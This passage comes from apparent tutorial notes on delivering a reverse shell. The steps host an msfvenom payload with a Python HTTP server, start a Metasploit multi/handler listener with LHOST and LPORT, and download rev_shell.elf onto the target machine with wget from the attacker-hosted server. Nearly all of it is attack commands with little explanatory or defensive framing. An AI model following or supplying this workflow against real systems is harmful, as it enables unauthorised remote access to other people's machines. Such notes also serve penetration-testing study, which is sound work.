- Go to the directory, where the payload is located and start the server there with the command:
- python -m http.server

1.  Start the msfconsole (Metasploit) Listener, so you can capture the exploit

Do this by using the following command:

- User exploit/multi/handler
- Show options
- Set LHOSTS (This will the the same that you set for the MSFVENOM Payload)
- Set LPORT (This will be the same that you set for the MSFVENOM paylaod)

1.  Download the Exploit on the target machine.

- This is basically the file that you have hosted using the python -m http.server command
- This file is now available for download on the internet as its hosted on the python server
- To download this file you will use the following command:

| Command | Wget <http://127.0.0.1:8000/rev_shell.elf> |
